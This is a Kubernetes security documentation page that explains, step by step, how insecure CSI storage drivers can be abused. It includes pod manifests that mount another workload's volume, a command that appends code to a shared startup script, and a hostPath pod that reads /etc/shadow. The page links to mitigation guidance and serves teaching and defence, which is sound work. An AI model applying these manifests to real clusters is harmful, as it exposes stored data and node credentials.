---
sidebar_position: 12
title: "Insecure CSI Drivers"
description: "How attackers exploit insecure Container Storage Interface (CSI) drivers to gain unauthorized access to persistent volumes and sensitive data."
keywords: [kubernetes security, CSI drivers, container storage interface, persistent volumes, storage security, volume security, PV security, CSI vulnerability, storage access, data breach]
tags: [attack-vector, storage, csi, volumes, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/csi_driver_mitigation/
  - /docs/attack_vectors/unrestricted_hostpath_mounts/
  - /docs/best_practices/cluster_setup_and_hardening/secrets_management/insecure_secrets_management_mitigation/
  - /docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation/
---

# Insecure CSI Drivers

**Container Storage Interface (CSI) drivers** enable Kubernetes to manage persistent storage across different backends. If **misconfigured** or **insecure**, these drivers can allow attackers to **access sensitive data, escalate privileges, or compromise the host node**.

This article explores how insecure CSI drivers can be abused to gain unauthorized access to persistent volumes or host filesystems.

---

## Exploitation Steps: Abusing Insecure CSI Drivers

### 1. Discover Exposed CSI Drivers

The attacker begins by identifying CSI drivers and storage classes that may lack security controls:

```bash
kubectl get storageclass
```

If a storage class uses a permissive CSI driver, the attacker proceeds to mount existing volumes.

### 2. Attach to a Sensitive Persistent Volume

The attacker creates a malicious pod that mounts a PVC from another workload:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
    - name: attacker-container
      image: alpine
      command: ["/bin/sh", "-c"]
      args: ["sleep 3600"]
      volumeMounts:
        - mountPath: /data
          name: compromised-volume
  volumes:
    - name: compromised-volume
      persistentVolumeClaim:
        claimName: sensitive-data-pvc
```

```bash
kubectl apply -f attacker-pod.yaml
```

Once the pod is running, the attacker can access the mounted data from `/data`.

### 3. Modify Shared Volumes (RWX Mode)

If the volume supports `ReadWriteMany`, the attacker injects malicious files:

```bash
echo "Malicious code" >> /data/startup.sh
```

This allows code execution when another pod uses the same volume.

### 4. Exploit Privileged CSI Driver Access

Some CSI drivers are deployed with host-level access. An attacker can exploit this by mounting the host filesystem:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: csi-exploit-pod
spec:
  containers:
    - name: exploit-container
      image: alpine
      command: ["/bin/sh", "-c"]
      args: ["cat /host/etc/shadow"]
      volumeMounts:
        - mountPath: /host
          name: host-mount
  volumes:
    - name: host-mount
      hostPath:
        path: /
        type: Directory
```

This gives the attacker read (or write) access to sensitive system files on the node.

---

### Result

A misconfigured CSI driver may enable:

- Unauthorized access to persistent data
- Modification of shared volumes
- Host filesystem access via privileged plugins
- Persistent backdoors via mounted scripts

---

## Mitigation

➡ [Securing Kubernetes CSI Drivers](/docs/best_practices/cluster_setup_and_hardening/pod_security/csi_driver_mitigation)

---

## References

This article is based on information from the following official sources:

1. [Container Storage Interface (CSI)](https://kubernetes.io/docs/concepts/storage/volumes/#csi) - Kubernetes Documentation
2. [Persistent Volumes](https://kubernetes.io/docs/concepts/storage/persistent-volumes/) - Kubernetes Documentation
3. [CSI Driver Development](https://kubernetes-csi.github.io/docs/) - Kubernetes CSI Documentation
